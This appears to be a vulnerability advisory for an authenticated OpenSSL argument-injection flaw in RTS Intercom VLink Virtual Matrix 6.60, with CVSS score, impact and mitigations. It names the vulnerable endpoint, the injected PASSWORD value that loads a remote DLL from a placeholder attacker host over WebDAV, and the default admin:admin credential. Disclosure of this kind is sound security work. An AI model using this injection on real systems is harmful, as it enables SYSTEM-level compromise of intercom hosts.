# RTS Intercom VLink Virtual Matrix — OpenSSL Argument Injection → SYSTEM RCE

## Summary

An authenticated remote code execution vulnerability in RTS Intercom / VLink Virtual Matrix 6.60. The SSL certificate generation API (`POST /api/v1/ssl/generatetlsclientcertificate`) concatenates the user-controlled `PASSWORD` field unquoted into the `openssl.exe pkcs12` command line (bare `%s` in a `vswprintf` format string; the validator only blocks `& , " >`). An attacker injects `-engine \\<attacker>@<port>\DavWWWRoot\evil.dll`, causing OpenSSL 1.1.1q to dynamically load a remote DLL over WebDAV/HTTP; `LoadLibraryW` fires `DllMain` on `DLL_PROCESS_ATTACH`. The service runs as **NT AUTHORITY\SYSTEM**, so the injected code executes with SYSTEM privileges (CWE-78 + CWE-426 + CWE-269).

## CVSS Score

- **Score**: 8.8 High
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

## Affected Products

- **Product**: RTS Intercom / VLink Virtual Matrix
- **Versions**: 6.60 (other versions with the same unquoted openssl command construction are likely affected)
- **Vendor**: RTS Intercom (Bosch/Keenfinity)

## Impact

- **Confidentiality**: Full compromise of the intercom/matrix host as SYSTEM
- **Integrity**: Arbitrary code execution in the SSL resource handler
- **Availability**: Full control of the virtual matrix service

## Mitigation

1. Build the openssl command with a strict argv array (`CreateProcessW`) or use `-passin file:`/stdin instead of string concatenation
2. Harden the validator to reject spaces, `-`, `\`, `/`, `|` in `PASSWORD`
3. Do not run the Web service as LocalSystem; use a least-privilege account
4. Remove the factory default `admin:admin` credential
